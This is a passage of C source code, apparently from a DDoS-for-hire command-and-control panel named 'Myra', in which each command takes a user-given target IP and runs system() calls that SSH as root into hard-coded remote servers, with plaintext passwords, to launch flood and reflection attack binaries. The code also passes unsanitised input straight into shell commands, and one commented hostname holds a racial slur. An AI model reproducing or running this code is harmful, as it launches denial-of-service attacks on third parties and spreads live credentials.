      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mR6-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mR6D\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].r6-drop.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./r6-drop %s r6-drop.txt 40 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mR6-DROP  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-R6DP \x1b[38;5;225m║ \x1b[38;5;168mThrottle\x1b[38;5;225m: \e[38;5;134m250\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".lhvz") || strstr(myra_buffer_size, ".LHVZ")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mPRV-ARK-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARK-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].private.attack\" -d -m sshpass -p succfuccs1234@12 ssh root@193.201.82.173 ./lhvz %s 86400\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mARK-DROP \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m86400\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ARKX \x1b[38;5;225m║ \x1b[38;5;168mThrottle\x1b[38;5;225m: \e[38;5;134m125\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".ark-drop") || strstr(myra_buffer_size, ".ARK-DROP")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      char *ipkill3[5000];
      trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARK-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARK-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].ark-drop.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./ark2 %s 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      sprintf(ipkill3, "screen -S \"%s.[%s].ark-drop.attack\" -d -m sshpass -p 90UJA90JKiopjfs9ipaofjewp9jfweru3298RJEWRhjtiure ssh root@45.143.220.92 ./ark-crash %s 12 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mARK-DROP \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m120\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ARKX \x1b[38;5;225m║ \x1b[38;5;168mThrottle\x1b[38;5;225m: \e[38;5;134m125\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".redbars") || strstr(myra_buffer_size, ".REDBARS")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mREDBARS\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mREDBARS\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].redbars.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./udphex %s 120\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mREDBARS  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m120\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-RBRS \x1b[38;5;225m║ \x1b[38;5;168mThrottle\x1b[38;5;225m: \e[38;5;134m125\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".oryx") || strstr(myra_buffer_size, ".ORYX")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      //char *ipkill4[5000];
      //trim_removev2(ipkill4);
      //char *ipkill5[5000];
      //trim_removev2(ipkill5);
      //char *ipkill6[5000];
      //trim_removev2(ipkill6);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mORYX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mORYX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].oryx.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./oryx %s 600 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].oryx.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./oryx %s 1500 1 50000 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill4, "screen -S \"%s.[%s].oryx.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.138.110.29 ./oryx %s %s 0 2 1200 0 1500\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill5, "screen -S \"%s.[%s].oryx.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./oryx %s %s 0 4 1200 0 1500\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill6, "screen -S \"%s.[%s].oryx.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./oryx %s %s 0 4 1200 0 1500\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      //system(ipkill4);
      //system(ipkill5);
      //system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mORYX     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ORYX \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    //if (strstr(myra_buffer_size, ".phoenix") || strstr(myra_buffer_size, ".PHOENIX")) // System Command Function
    //{
    //char iptarget[5000]; // Char Every Line For Output Communication
    //char *token = strtok(myra_buffer_size, " "); // Create Delimiter
    //snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
    //trim_removev2(iptarget); // Trim [iptarget]
    //char *ipkill[5000]; // Creating A System Function
    //trim_removev2(ipkill); // Trim [ipkill]
    //char *ipkill2[5000];
    //trim_removev2(ipkill2); // Trim [ipkill]
    //sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mPHOENIX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mPHOENIX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
    //sprintf(ipkill2, "screen -S \"%s.[%s].phoenix.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./phoenix %s 10 -1 1200 0\r\n", iptarget);
    //system(ipkill); // System Execution
    //system(ipkill2);
    //sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mPHOENIX  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-PHNIX\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m4\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
    //if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    //}
    if (strstr(myra_buffer_size, ".nikolai") || strstr(myra_buffer_size, ".NIKOLAI")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2); // Trim [ipkill]
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mNIKOLAI\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mNIKOLAI\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/nikolai-atk/nikolai %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/nikolai-atk/nikolai.txt 3 -1 120\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mNIKOLAI  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-CHRGN\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".ares") || strstr(myra_buffer_size, ".ares")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   //
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARESX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARESX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/ares-atk/ares %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/ares-atk/ares.txt 4 -1 120\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mARES     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ARES \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".cod-drop") || strstr(myra_buffer_size, ".COD-DROP")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);
      //char *ipkill3[5000]; // Creating A System Function
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCOD-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCOD-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/bo4drop-atk/gme-brk %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/bo4drop-atk/bo4drop.txt 250 40\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/bo4drop-atk/gme-brk %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/bo4drop-atk/bo4drop.txt 250 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mCOD-DROP \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m40\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-CDDRP\x1b[38;5;225m║ \x1b[38;5;168mThrottle\x1b[38;5;225m: \e[38;5;134m250\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".chimera") || strstr(myra_buffer_size, ".CHIMERA")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
